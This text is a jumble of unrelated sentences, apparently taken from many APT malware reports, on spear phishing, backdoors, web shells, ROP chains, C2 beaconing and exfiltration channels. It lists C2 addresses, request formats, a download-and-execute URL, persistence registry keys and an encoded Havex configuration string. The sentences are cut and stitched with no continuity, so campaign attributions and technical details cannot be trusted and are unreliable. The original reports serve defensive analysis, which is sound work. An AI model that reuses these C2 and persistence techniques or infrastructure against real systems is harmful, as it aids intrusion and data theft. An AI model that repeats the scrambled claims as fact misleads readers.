The spear phishing document was in RTF format which as designed loads MSCOMCTL.ocx and exploits CVE 2012-0158 .
Overall , this malware was observed to send information about the computer and set up a backdoor for remote access .
The good news is that if an entity is actively patching Windows PE files for Windows Update , the update verification process detects it , and you will receive error code 0×80200053 .
In addition , these files need administrative privileges to execute , and they will execute the payload that was patched into the binary during download with those elevated privileges .
Since the user , not the automatic update process , is initiating these downloads , these files are not automatically verified before execution as with Windows Update .
By using a wrapper for the original binary , the malware authors do not invoke the NSIS error and bypass simple self-checking mechanisms .
Exitmap is Python-based and allows one to write modules to check exit nodes for various modifications of traffic .
This backdoor also has functionality to load additional plugins from the command and control server .
] com served as a command and control server for Mongall payloads distributed by the DragonOK group .
If the CPU core check detects more than one core , it implants the NewCT2 RAT in % temp % \MSSoap.DLL ( some variants will use BurnDCSrv.DLL and IntelAMTPP.DLL ) and executes the written file .
The command and control server in question was located at 58.64.201.229 .
Additionally , the Moafee group also hosted a PoisonIvy command and control server at phi .
The media type of the request is chosen from the following list :  ICMP protocol the attackers can choose to use ICMP ( ping ) to exfiltrate data  SMTP protocol the attackers can send exfiltrated data by email  Named pipe the attackers can use Microsoft 's named pipe to communicate to another infected machine .
It can spy on each and every infected machine and manages to send the exfiltrated information back to the attackers , by relaying this exfiltrated data through infected machines to one machine with Internet connection .
 HTTP protocol the attackers can choose to use a website to exfiltrate data .
The rootkit is able to take control of an infected machine , execute arbitrary commands and hide system activities .
This information can be used to perform `` pass the hash '' 2 attacks , to compromise new systems within the infrastructure  information gathering tools , to get information on the infected system  RAR tools , to create archives of stolen documents  Microsoft Office document stealer  … The driver injects several libraries into user land .
That email contained a malicious excel �le , which once opened and its VBA code executed , would infect the victim 's computer .
Logs and proxy servers should be checked for communication with the IP addresses with which the malware communicates : 83.170.33.60 83.170.33.37 If you think you got infected , check in the system root folder for a �le called NTUSER.DAT .
In this report we analyze one case of an operation protective edge themed spear phishing attack .
'' [ 1 ] This is a social engineering tactic meant to lure the victim into enabling Macro content .
The �le name is `` svchost 67.exe '' ( MD5 : 916be1b609ed3dc80e5039a1d8102e82 ) and it was uploaded to Virus Total [ 5 ] on 2 June 2014 , more than two months earlier than `` Operation Protective Edge.xlsb '' .
The response of the command and control server will be encrypted using the id field in the POST request as the key .
It does not have a driver component and the installer drops the main DLL component directly to the local application data ( non- roaming ) folder .
We believe they are either dropped by another executable that uses social engineering tricks to mislead the user into executing the installer , or by documents containing exploits that silently perform the installation .
The toolkit also comes with server-side scripts , which the attackers set up in the command and control ( C & C ) server .
These documents drop and execute the installer , then open a decoy document .
While it appears that the attackers used spear-phishing ( via email ) , their primary technique was the use of a `` watering-hole '' attack whereby they attack websites known to be frequented by the target using techniques such as SQL injection , and upload malicious files to these website .
Symantec believes that the exploits were packed with a Trojan and Command & Control ( C2 ) server address using a platform that gives the group its name : `` Elderwood .
Purpose : Exfiltration of `` a historically unprecedented transfer of wealth-closely guarded national secrets ( including those from classified government networks ) , source code , bug databases , email archives , negotiation plans and exploration details for new oil and gas field auctions , document stores , legal contracts , supervisory control and data acquisition ( SCADA ) configurations , design schematics , and much more '' Entry Method : Spear Phishing Countries with Companies Affected : U.S. Synopsis : Dell SecureWorks gives a fairly good collection of technical details about the campaign they 've dubbed `` Mirage '' for the string used to connect to the C2 server by the Remote Access Trojan , but largely they focused on studying the tool , not monitoring the APT activity .
From here they could have stolen credentials or otherwise escalated privileges to gain access to the safety systems on the Deepwater Horizon and other rigs operating in the area .
By extension of these occurances , it may be concluded that a capable attacker could manipulate safety control systems of an oil rig from shore , and do so through a sophisticated control system virus which can operate even when not in contact with a C2 server .
In order to do that , the malware injects itself into the EXPLORER.EXE process , sends a GET/POST request to the PHP script on the compromised website , then reads the HTML document returned by the script , looking for a base64 encrypted data between the two `` havex '' strings in the comment tag < ! -- havexhavex -- > and writes this data it to a % TEMP % \ < tmp > .xmd
The RAT gets its commands by sending a request to a PHP script on the C & C ( compromised server ) as usual , and looks for specific data in the returned HTML code .
After checking if a connection to the Internet is up , it sends an initial POST request to the C & C server .
Besides backdoor functionality , it also extracts credentials from Internet Explorer 's password manager to the prx.jpg file and injects a small DLL into the processes of web browsers .
All harvested data is compressed , encrypted and written into the % TEMP % \*.yls files , which are then sent to the C & C by the main Havex/Sysmain module .
Sample B is identiﬁed to be a HTTP controlled backdoor , enabling the attacker to take full control over the victim computer .
A full request looks like : The user agent is always Sent accept headers are : The malware creates in a value 'AppID ' with the data it calculates from GetTickcount ( ) , used as an identiﬁer/mutex .
We assume the ﬁle is only dropped and/or executed on request via stage 2 of Miniduke and not running persistently .
The analysis of Sample B revealed the commands as shown in table 1 The attacker controls the remote computer via HTTP GET and POST requests like the following : The request is encoded in a custom BASE64 encoding , using the following alphabet : The malware connects via HTTP GET and POST requests to and the path is ﬁxed : The variable part is the custom BASE64 encoded string corresponding to `` i= '' .
Sample B , contained in Sample A , can be categorized as an exhaustive backdoor , implementing any kind of functionality that can be expected for this kind of attacks .
Meanwhile , the Naxalites_Funded_By_Pakistan.scr file drops a slightly different malware component and an alternate decoy document .
file that drops a decoy document pertaining to the alleged incompetence of Pakistani authorities in locating Osama Bin Laden ( OBL ) .
This file contained a version number 1.0 , likely denoting the version of the backdoor and/or the command and control ( C2 ) backend .
The files ExtractPDF.exe and Start.exe simply serve as utilities to open the PDF file and execute the winsocks.exe backdoor component .
The winsocks.exe backdoor also contains hardcoded strings of Office file extensions , telegraphing the likely intention of the attackers in collecting and exfiltrating office automated documents from victim networks .
The ROP payload basically tries to make memory at 0×18184000 executable , and to return to 0x1818411c to execute the shellcode .
CVE-2010-3962 , then a 0-day exploit in Internet Explorer 6 , 7 , and 8 dropped the Pirpi payload discussed in this previous case .
They are extremely proficient at lateral movement and are difficult to track , as they typically do not reuse command and control infrastructure .
It then replaces the vftable of a sound object with a fake one that points to the newly created ROP payload .
With the addresses of the aforementioned APIs and gadget , the SWF file constructs a ROP chain , and prepends it to its RC4 decrypted shellcode .
To summarize , it is obvious that this executable module is a backdoor , capable of taking screenshots , stealing files , downloading new files from the Internet , starting and killing processes , including interactive Windows shell commands , file search and interaction with mysql database server .
If the system has a running process named `` 360tray.exe '' , then the embedded file is stored in % SYSTEM % \MFC42LOC.DLL , then copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp and runs a new process from that location via WMI Win32_Process.Create method .
The DLL contained a backdoor payload , or , to be exact , the functionality of a fully-fledged Remote Administration Tool ( RAT ) , which gave the cyber-criminals the ability to control the victim computer without the user 's knowledge .
The module attempts to connect to the list of 8 domains , consisting of the following command and control servers ( some of them are used more than once ) : a1.googletrait.com a1.nexongame.net a1.reegame.net mail.nexongame.net It automatically looks for open C & C ports in the following order 53,443,8080,25,80,3690,1433,80 .
If the system has a running process named `` bdagent.exe '' , then it copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp , decodes an embedded Base64 string and executes .
They contain an encrypted config block that points to the next stages : Once decrypted , the block contains several folder names and registry key names : In the example above , the stage 1 tries to load a second stage from the extended attributes of the system direc- tory specified in the configuration block ( in our case , the WINDOWS folder ) .
Once the encrypted third stage is read from the registry or NTFS EAs , it is decrypted using the RC5 algorithm and a fixed 16-byte key that is hardcoded in the second stage .
Just like the first stage , it loads the encrypted body of the next stage from the end of the physical disk and decrypts it with a hardcoded RC5 key , then decompresses it using the nrv2 algorithm from the UCL library .
Essentially , the second stage can remove all the Regin stages from the system , effectively cleaning the machine and leaving only the encrypted VFS behind .
Known data blocks and their configuration IDs : Known executable modules and their plugin IDs : The attackers can dynamically add and delete plugins inside the VFS and each victim installation has a different set of plugins depending on the type of activity the attackers need to execute .
• Get bot version and uptime • Get directory file listing , all drives or from specific path • Stop activities for a given period • Download file • Send local file to the server • Execute shell command • Connect to IRC server • Change nick ( IRC ) • Join channel ( IRC ) • IRC disconnect • Remove bot from system The HTTP portion is designed to get configuration data used in the IRC botnet and to send stolen documents back to the control server .
AhnlabUpdate drops and runs an additional executable , which is the RAT payload that establishes a connection with the control server .
The malware joined the IRC channel # god and sent several private messages to what was likely the control server to receive instructions .
It 's not widely known that the attackers used a remote-access Trojan to compromise an internal server .
After executing , the remote-access Trojan makes a connection to sujewha.com , the IRC control server .
They connect to the Command and Control server wreckmove.org ( 188.240.47.145 ) via HTTP on port 80 , using a peculiar and recognizable pattern : GET /flaws/snwd.php ? tp=1 & tg= [ ID ] & tv=Error [ ] & ts= [ PLATFORM ] & mt= [ account ] & tr= [ NoFiles ] & Y1Y5F2 HTTP/1.1 Accept : */* Accept-Encoding : gzip , deflate User-Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET
On this site there 's what appears to be an installer for the Bitdefender antivirus product ( bitdefender_tsecurity.zip , md5 62b702a15a762692eda296b0aea270f9 ) , but the zip file contains both a real installer and a Visual Basic trojan identical to the one used against Telenor .
The initial spear phishing mail contained two files as attachments – a document named `` 220113.doc '' , and an executable file `` few important operational documents.doc.exe '' .
C & C , C2 , CC : Command- and Control server .
We found logs in the open drop folders that contained suggestive data , such as this snippet from a 2012 log entry ( subdomain redacted ) : Host Name : PC-PS2CHAIRMAN Registered Owner : admin Time Zone : ( GMT+05:00 ) Islamabad , Karachi Domain : ****.gov.pk Sinkhole-logged HTTP requests are also informative , such as this seemingly from a Pakistani embassy : '' GET /sdata/shopx.php ? fol=EMBASSYOFPAKIST-Embassy % 20of % 20Pakistan ...
Using a web shell as a primary backdoor gives Deep Panda several advantages : Low to virtually no detection by antivirus products The absence of command and control beacon traffic Impossible to block known malicious IP addresses to a web server since adversary can easily change their source IP address Cookie and HTTP header authentication aware web shells avoid being enumerated by search engines and restrict access , further reducing their network footprint To assist organizations with identifying web shells in their environment , this post will cover two popular Deep Panda web shells .
As a simple example of an encoded command , the following GET request would cause the backdoor to execute the code Response.Write ( `` < h1 > Hello World < /h1 > '' ) and would render '' Hello World '' to be printed in the web browser : Path : C : \inetpub\wwwroot\aspnet_client\system_web\ < VERSION > \ MD5 Hash : cc875db104a602e6c12196fe90559fb6 File Size : 45187 Table 4 : Metadata of `` system_web.aspx '' System_web.aspx is an excellent example of a more robust web shell used to replace Deep Panda 's traditional beaconing command and control infrastructure .
Parts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment : A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP .
The code handles create , delete , set , get , and enum queries , while any query not matching those is executed directly .
In short , system_web.aspx provides an adversary with a very stealthy means of near full control of the server on which it resides .
Packet capture on port 1321/tcp : ShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites .
The svchost.exe initiates an outbound connection to a command and control ( C2 ) server hosted at thejoe.publicvm.com .
A fake `` svchost.exe '' is installed in the victim 's Application Data directory : C : \Documents and Settings\ < Username > \Application Data\svchost.exe Dropped files on execution of VPN-Pro.exe : Examination of the `` svchost.exe '' binary shows multiple references to `` ShadowTech Rat .
Excerpt from G.php : Once extracted , the binary of `` Sample A '' has the following properties : The malware also adds a registry key to make it persistent across reboots : The malware contains strings referring to `` Data Protector v2 '' which appears to refer a crypter that is compatible with a range of RATs and advertised for download in a number of forums .
Once the malware is successfully installed on the victim 's computer , it communicates with a C2 server at : tn5.linkpc.net On June 11 , this pointed to the following SyriaTel address : This domain has been active since at least October 2012 and has pointed to many different addresses in Syrian IP space on both the SyriaTel and Tarassul ISPs , as well as AnchorFree VPN addresses .
Figure 3 : RC4 key , C & C information , and campaign mark The malware then accesses a C & C server over HTTP POST to send data using the domain name and URL path in SafeCredential.DAT .
The Safe campaign attackers used spear-phishing emails with malicious attachments .
php , which provided the functionality for data exfiltration ; and utils.php , which contained the encryption functions in order to encrypt and decrypt communications between a compromised host and a C & C server .
The names of the plug-ins are : • OpenDoc • UsbDoc • UsbExe Tools The tools used by Safe are off-the-shelf programs that are able to extract saved passwords from Internet Explorer® ( IE ) and Mozilla Firefox® as well as any stored Remote Desktop Protocol ( RDP ) credentials .
The data that the malware sends from a compromised host to report.php is decrypted by the C & C server and stored in a MySQL™ database .
If it is a DLL file , it attempts to load it via LoadLibrary ( ) ; if it is an EXE file , it gets written on disk with one of the following names : winupdt.exe , wcsntfy.exe , netmngr.exe , dumpreport.exe , taskhosts.exe , wupdmngr.exe , winhlp.exe , dllhosts.exe , dxdiagupd.exe , dialers.exe , netschd.exe , connwiz.exe , certupdt.exe , repfault.exe , wuapreport.exe , lanmgr.exe .
Until now , we have only found spreading mechanisms that use social engineering via malicious PDF files sent over e-mail ( see Appendix F : Forged documents↓ ) .
As the malicious PDF file is opened , the Adobe process gets exploited , which results in running the dropper .
The file is dropped with a name randomly chosen from a list in the % ALLUSERSPROFILE % \ Application Data folder set to automatically start after reboot as described below :  for samples in 2011/2012 : the malware modifies the Shell key in Software\Microsoft\Windows NT\CurrentVersion\Winlogon .
The sample from 2011 checks for the current date using http : //tycho.usno.navy.mil/cgi- bin/timer.pl The sample from 2012 checks for the current date using http : //www.time- server.org/gettime.php ? country=China The samples compiled in 2013 get the current date from the operating system .
The following images were found during online research : The following table provides information about some of the servers hosting and distributing malware and some of the filename patterns discovered : The following table provides information about the relationship between the malicious servers , detection names by antivirus tools , and vertical market affected ( based on unique hashes and detections ) : A bot malware has features like anti-reversing , credential stealing/keystroke logging/form grabbing , DNS changer , process injection , antivirus process killing , blocking of security related websites , backdoor , and others .
This section presents information about some of the servers we have observed hosting and distributing malware , filename patterns , as well as a triage analysis of various pieces of malware observed delivered by these servers - Servers observed hosting and distributing malware : - Some of the filename patterns observed : - Triage analysis of various pieces of malware observed delivered by servers mentioned in this report : ( Please note that the activity in this section has been recorded per initial file infection and not individually per file downloaded and executed by the initial malware under investigation ) o Andromeda MD5 : 036eb11a5751c77bc65006769921c8e5 This file was observed hosted in the following servers : 1 .
] 140 ( China ) POST request : /newfiz3/tasks.php Data : ping=1 Server response : pong POST request : /newfiz3/tasks.php Data : getcmd=1 & uid= [ removed ] & os=Win+7+Enterprise+ ( x64 ) & av=Symantec+Endpoint+Protection & nat=yes & version=3.2.1 & serial= [ removed ] & quality=0 POST request : /newfiz3/tasks.php Data : taskexec=1 & task_id=1416470040933917 GET request : 54.69.90 [ .
Some of the main Bot types of malware detected through this research include : -­‐ Andromeda Andromeda is a modular bot that downloads modules and updates from its command and control ( C & C ) server during execution .
] 248 ( China ) POST request : /bla02/gate.php Made a copy itself to : C : \ProgramData\msitygyd.exe Hash of file copied : 13475d0fdba8dc7a648b57b10e8296d5 Registry entrenchment : Key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\ Value name : 172157644 Value data : C : \ProgramData\msitygyd.exe Key : HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\ CurrentVersion\Policies\Explorer\Run Value name : 172157644 Value data : C : \ProgramData\msitygyd.exe Process Injection : C : \Windows\SysWOW64\msiexec.exe The malware appears to have rootkit functionality .
SwissRanger camera driver ( sysmain dropper ) A hijacked installer of libMesaSR used by the `` SwissRanger '' camera driver , produced by Acroname : http : //www.acroname.com/ Files details : SHA-256 : 398a69b8be2ea2b4a6ed23a55459e0469f657e6c7703871f63da63fb04cefe90 Size : 1311927 Compiled : Sat , 28 May 2011 16:04:38 UTC Detected as : Trojan.Win32.Inject.hhwa Description : trojanized installer Path : % TEMP % \tmp687.dll and % APPDATA % \sydmain.dll SHA-256 : a8e6abaa0ddc34b9db6bda17b502be7f802fb880941ce2bd0473fd9569113599 Size : 133152 Compiled : Wed , 12 Jun 2013 04:31:14 UTC Detected as : Trojan.Win32.Inject.hhwa Description : Sysmain backdoor Path : % TEMP % \setup.exe SHA-256 : 7fa188fb3bfecbd0fbbb05cfa4a3078ac44f68c63b784b20046e470613e35f96 Size : 1181500 Compiled : Sat , 05 Dec 2009 22:50:52 UTC Description : original installer , version 1.0.14.706 Registry modification : [ HKCU\Software\Microsoft\Windows\CurrentVersion\Run ] load = C : \WINDOWS\system32\rundll32.exe `` c : \documents and settings\luser\application data\sydmain.dll '' , AGTwLoad eWon software ( Havex dropper ) A hijacked installer of eCatcher - a piece of legitimate software developed by a Belgian producer of SCADA and industrial network equipment : http : //www.ewon.be/en/home.html Files details : SHA-256 : 70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9 Size : 43971440 Compiled : Sat , 31 Mar 2007 15:09:46 UTC Detected as : ( not detected yet ) Description : trojanized installer Url : hxxp : //www.ewon.biz/software/eCatcher/eCatcherSetup.exe Path : % TEMP % \TmProvider.dll and % SYSTEM % \TMPProvider.dll SHA-256 : 401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67 Size : 327168 Compiled : Mon , 30 Dec 2013 12:53:48 UTC Description : Havex version 038 Path : % TEMP % \eCatcherSetup.exe SHA-256 : c7caa7fa2a23508b0a024a6a4b2dcaad34ab11ea42dffc3a452901c007cdfc34 Size : 43785864 Compiled : Fri , 19 Jun 1992 22:22:17 UTC Description : original installer , version 4.0.0.13073 Path : % TEMP % \qln.dbx Size : 2 Description : text file with Havex version number Registry modification : [ HKCU/HKLM\Software\Microsoft\Windows\CurrentVersion\Run ] TmProvider = rundll32 `` % SYSTEM % \TMPprovider038.dll '' , RunDllEntry [ HKLM\Software\Microsoft\Internet Explorer\InternetRegistry ] fertger = 269684507736283195770098FD80-25 mbCheck software ( Havex dropper ) A hijacked installer of legitimate software for the remote maintenance of PLC systems - mbCHECK produced by MB Connect Line GmbH : http : //www.mbconnectline.com/index.php/en/ Files details : SHA-256 : 0b74282d9c03affb25bbecf28d5155c582e246f0ce21be27b75504f1779707f5 Size : 1141478 Compiled : Sun , 14 Jul 2013 20:09:51 UTC ) Detected as : Trojan-Dropper.Win32.Injector.kcnn Description : Trojanized installer Path : and % SYSTEM % \svcprocess043.dll % TEMP % \mbCHECK.dll SHA-256 : d5687b5c5cec11c851e84a1d40af3ef52607575487a70224f63458c24481076c Size : 437248 Compiled : Fri , 11 Apr 2014 05:37:36 UTC Description : Havex version 043 Resource : 12.MTMxMjMxMg==.5.havex.14400000.12.Explorer.EXE.0.2.66.sinfulce lebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php.90.ra pidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-sett ings/bp-settings-src.php.354.AATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED 9LxIVQr2Z/gsrHIsgTvK9AusdFo+9..fzAxf1zXj42880+kUmktmVb5HSYi8T27Q 54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk..09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja +Ml4SI7e60C4qDQAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAQAB .
`` testlog.php '' is not a PHP-script but it contains the C & C Server logfile of Backdoor-connections .
The WorkReceive function essentially does a GET request on the C & C server in order to receive a task to complete on the infected computer .
Writes the above information to `` testlog.php '' , separated by `` Tabulator '' and base64-encoded , with the following syntax : < timestamp > \t < victim ip-address > \t < proxy > \t < botID > \t < request-uri > \t < useragent > 3 .
The LIB command is used to load a DLL on the infected machine .
The response is saved to file % TMP % \order.dat The content of order.dat is converted from widechar to multibyte string and is parsed for the following command strings : If any of the commands above is found , the Trojan notifies the C & C that the command was received by issuing the following POST request : Full HTTP/1.1 headers : The cmd command expect a payload string ( < COMMAND > ) following the `` cmd_ '' prefix , so that the full command syntax looks like this : cmd_ < COMMAND > .
During our investigation , we identified several types of exploits being used through spear-phishing e-mails against the targets : > > CVE-2012-1856 ( the `` Tran Duy Linh '' ( also see : http : //blog.malwaretracker.com/2013/06/ tomato-garden-campaign-possible.html ) exploit fixed in Microsoft 's MS12-060 security bulletin ) > > CVE-2012-0158 ( the MSCOMCTL.OCX remote code execution vulnerability fixed with Microsoft 's MS12-027 security bulletin ) > > Web links to Oracle Java exploits ( CVE-2013-0422 and CVE-2012-1723 ) > > HLP exploits and abuse of features > > HWP exploits The first two vulnerabilities are exploited through Microsoft Office documents ( Word and Excel ) that drop and execute the backdoor and show a fake `` lure '' document to the victim .
The module was created from the same source code as the dropper but instead of installing the backdoor module , it only executes the malicious payload and the decoy application : `` % bundle path % /Contents/Resources/.launchd.app '' `` % bundle path % /Contents/Resources/.Img2icns.app '' ( the original `` Img2icns '' application , http : //www.img2icnsapp.com/ ) .
The backdoor beams out to the command-and-control server at www.setchon [ dot ] com/jd/ upload.aspx The Icefog attackers are also using HLP files to infect their targets .
If no known command is parsed out of the server response , the Trojan notifies the server about being alive by issuing the following HTTP POST request : After that it sleeps for 150 seconds and starts the command-processing loop again .
• The analysis showed that the perpetrator succeeded in creating and uploading several files to the web server that contained malicious code , allowing the perpetrator to send commands to the server from a remote location .
I installed backdoors on hundreds of workstations which allows me the ability to monitor email servers , so emails with interesting attachments can be forwarded to me .
Examples of such attempts include luring Internet users into execution of malware and Spear Phishing .
The second vulnerability makes it possible for hackers to intercept the network traffic between operator and devices which may contain authentication credentials .
Spear phishing is an e-mail spoofing fraud attempt that targets a specific organisation , seeking unauthorised access to confidential data .
The following reflects observations during field unit execution from an infected external drive : File Name : netsat.exe File Size : 43520 bytes MD5 : eb8399483b55f416e48a320d68597d72 Previous analysis results indicated netsat.exe retrieved commands from an encrypted file named netwn.drv resident in the CSIDL_WINDOWS\msagent\ directory .
This continues to suggest that intruders either have local or remote access to headquarters systems running netsat.exe or access to another application that automates remote C2 data/file retrieval .
The headquarters component infects drives connected to its host system with the field unit component and retrieves data from the field unit on the infected drive 's return to the headquarters host system .
The following table reflects testing and theoretical contents of command files driving netsat.exe operation : The Following Are Hypothetical Scenarios Designed to Illustrate Possible Employment Options Possible Commands One -­ Targeting Specific Devices ( Known to Intruder From Previous netsat/netui3 Activity ) Possible Commands Two -­ Maximizing Propagation ( Theoretical ) The headquarters component ( netsat.exe ) logs certain events in a file located at CSIDL_MYPICTURES\wins .
Netsat.exe functioned as a master application affording intruders the ability , in a selective and controlled manner , to infest removable devices with an agent application in the form of netui3.dll , aka setup35.exe , aka update.exe .
It has two key components : the Web shell command-and-control ( CnC ) client binary and a text-based Web shell payload ( server component ) .
This small , text-based payload can be delivered using any of the following mechanisms : • WebDAV file upload • JBoss jmx-console or Apache Tomcat management pages ( For more details on this attack vector , read FireEye consultant Tony Lee 's explanation ) • Remote exploit with a file drop • Lateral propagation from other access After examining the server-side payload and the client used to control the Web shell , the next step to understanding China Chopper is observing its traffic .
The server-side content could easily be overlooked among the other files associated with a vanilla install of a complex application .
`` Server-side Payload Component '' on Page 5 showed China Chopper executing on a Windows 2003 IIS server using ASPX .
Running the Web shell through the virus-scanning website `` No Virus Thanks '' shows a detection rate of 0 out of 14 , indicating that most , if not all , anti-virus tools would miss the Web shell on an infected system .
[ 6 ] Below are some of the names of Etumbot installers using RTLO successfully : As the backdoor executes from our previous example , C : \DOCUME~1\User\LOCALS~1\Temp\ kb71271.log is created and contains the following registry file to make the malware persistent : [ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ] `` JavaSvc '' = '' C : \\Documents and Settings\\User\\Application Data\\JAVA\\JavaSvc.exe '' The dropper then calls regedit with kb71271.log as a parameter to modify the registry .
Returning to the first sample , once the dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs the Etumbot backdoor ( 82d4850a02375a7447d2d0381b642a72 ) , an initial HTTP beacon is sent to the Command & Control server that requests an RC4 encryption key .
For example , both malware families have been seen using the same ka4281x3.log and kb71271.log files , both families have been observed calling back to the same Command & Control servers and have been used to target similar victim populations with similar attack methodologies .
Stage one has been seen to leverage the Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or Microsoft Office documents to convince the user to click and therefore execute the malware , which then runs the backdoor and displays the distraction file .
When executed , the dropper loads up a resource named `` BINARY '' from the resource section then creates the directory C : \Documents and Settings\User\Application Data\JAVA , then creates a temporary file C : \DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log then creates C : \Documents and Settings\User\Application Data\JAVA\JavaSvc.exe from the aforementioned BINARY resource .
Once the server executes on a target 's endpoint , it connects to a PIVY client installed on the attacker 's machine , giving the attacker control of the target system .
The tools are available for download at the following locations : • https : //github.com/fireeye/pycommands • https : //github.com/fireeye/chopshop By tracking the PIVY server activity , security professionals can find these telltale indicators : • The domains and IPs used for Command and Control ( CnC ) • The attacker 's PIVY process mutex • The attacker 's PIVY password • The launcher code used in the malware droppers • A timeline of malware activity This report explains how Calamine can connect these and other facets of the attack .
[ 2013-07-03 06:46:29 PDT ] Poison Ivy Version:2.32 [ 2013-07-03 06:46:30 PDT ] *** Host Information*** PI profile ID : mal IP address : 192.168.0.12 Hostname : BLUE Windows User : admin Windows Version : Windows XP Windows Build : 2600 Service Pack : Service Pack 3 Attacker 's View [ 2013-07-03 06:46:36 PDT ] *** Shell Session *** Microsoft Windows XP [ Version 5.1.2600 ] ( C ) Copyright 1985-2001 Microsoft Corp. C : \ > [ 2013-07-03 06:46:42 PDT ] *** Shell Session *** ipconfig [ 2013-07-03 06:46:43 PDT ] *** Shell Session *** Windows IP Configuration Connection-specific DNS Suffix .
Figure 22 outlines several executables delivered in ZIP files attached to menuPass spear-phishing emails .
The Poison Ivy builder kit allows attackers to customize and build their own PIVY server , which is delivered as mobile code to a target that has been compromised , typically using social engineering .
These are used both to steal data and credentials from compromised machines , and to use the machine as a staging post to conduct attacks against further systems on the network , allowing the attackers to spread their compromise within the organization .
Frequently the group deploys a remote access trojan ( RAT ) on compromised machines .
ESA can block spear phishing emails sent by threat actors as part of their campaign .
We have also observed them using SQL injection as part of their attacks , and exploits based on CVE-2012-1889 and CVE-2013-3893 .
The preferred tactics of the group include watering-hole attacks , spear-phishing , and other web-based tactics .
We observed this actor target : Google Code Command and Control Furthermore , we also discovered this same actor conducting a parallel campaign that leveraged Google Code for command and control .
We decoded the commands hosted at these linked projects and found that they issued the following decoded commands : It is likely that other yet to be discovered Kaba variants are configured to connect to these related Google Code projects and then redirect to this list of IP addresses .
Our initial conclusion was that this traffic was the result of malicious actors 'sleeping ' their implants , by pointing their command and control domains at legitimate IP addresses .
We also noted that this sample was configured to connect directly to 59.125.42.168 – one IP address away from the IP that received traffic from the hijacked www.outlook.com domain .
The sfxrar contained the following files : Setup.exe is a legitimate executable from Kaspersky used to load the Kaba ( aka PlugX ) files – msi.dll and msi.dll.dat .
Filename : css.jpg File size : 168776 bytes MD5 hash : b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash : 394703d1240ccd3aaeeef50c212313e3036741b1 Notes : Executable file downloaded by Java Applet that has been encoded with XOR 0Ã-99 Taking a closer look at the resulting executable we have , it turns out it is a newer sample of PlugX .
This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems .
Each request results in an HTTP 403 response from the server .
If one were to click Run from this prompt , it would result in the file css.jpg being download over an encrypted channel from a folder on https : //elsa-jp.jp .
Filename : main.dll File size : 13824 bytes MD5 hash : 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash : 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes : 32-bit version of malware , which beacons to 58.64.178.77:443 .
Watering hole attacks offer a much better chance of success because they involve compromising legitimate websites and installing malware intended to compromise website visitors .
We can not confirm the initial compromised sites , but we noted traffic to several known re-direct sites and the malware was configured to use the same command and control ( C2 ) server .
In contrast to many other APT campaigns , which tend to rely heavily on spear phishing to gain victims , '' th3bug '' is known for compromising legitimate websites their intended visitors are likely to frequent .
The file was named `` PYvBte.jar '' but was actually a Windows executable .
When this file runs , it downloads a payload from uyghurweb.net/player/gmuweb.exe and executes it .
WEBC2 backdoors typically give APT1 attackers a short and rudimentary set of commands to issue to victim systems , including : »» Open an interactive command shell ( usually Windows ' cmd.exe ) »» Download and execute a file »» Sleep ( i.e .
This script performs the following functions and saves the results to a text file : »» Display the victim 's network configuration information »» List the services that have started on the victim system »» List currently running processes »» List accounts on the system »» List accounts with administrator privileges »» List current network connections »» List currently connected network shares »» List other systems on the network »» List network computers and accounts according to group ( `` domain controllers , '' `` domain users , '' `` domain admins , '' etc .
APT groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and devices inside of a victim network .
In almost every case , APT backdoors initiate outbound connections to the intruder 's `` command and control '' ( C2 ) server .
The programs acting as APT1 servers have mainly been : ( 1 ) FTP , for transferring files ; ( 2 ) web , primarily for WEBC2 ; ( 3 ) RDP , for remote graphical control of a system ; ( 4 ) HTRAN , for proxying ; and ( 5 ) C2 servers associated with various backdoor families ( covered in Appendix C : The Malware Arsenal ) .
0.08 3f2e9251bcd17a2cb17e9202d1b100d3 The following processes were started when the `` Authorization.exe '' malware was executed : C : \Windows\System32\netsh.exe % APPDATA % \msnco.exe The following files were created when the `` Authorization.exe '' malware was executed : % APPDATA % \msnco.exe C : \WINDOWS\Prefetch\AUTHORIZATION.EXE-0AD199D6.pf C : \Documents and Settings\ % USERNAME % \Start Menu\Programs\Startup\b6554e5bcfef391ff7a7ffda58092e10.exe C : \WINDOWS\Prefetch\NETSH.EXE-085CFFDE.pf C : \WINDOWS\Prefetch\MSNCO.EXE-1616CBE8.pf [ CWD ] \.tmp ( or when created by the original dropper : `` C : \Extracted\.tmp '' ) The following registry values were set by the `` Authorization.exe '' malware when it was executed : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\b6554e5 bcfef391ff7a7ffda58092e10 [ Value : `` [ % APPDATA % ] \msnco.exe '' ..
